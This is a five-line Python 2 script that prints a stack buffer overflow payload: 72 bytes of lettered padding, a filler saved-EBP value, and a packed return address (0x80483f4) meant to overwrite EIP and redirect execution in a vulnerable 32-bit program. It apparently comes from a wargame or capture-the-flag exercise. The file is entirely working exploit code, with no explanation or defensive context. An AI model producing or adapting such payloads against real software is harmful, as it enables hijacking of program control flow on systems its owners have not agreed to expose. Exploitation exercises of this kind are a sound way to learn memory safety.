import struct
padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRR"
ebp = "AAAA"
eip = struct.pack("I", 0x80483f4)
print padding+ebp+eip
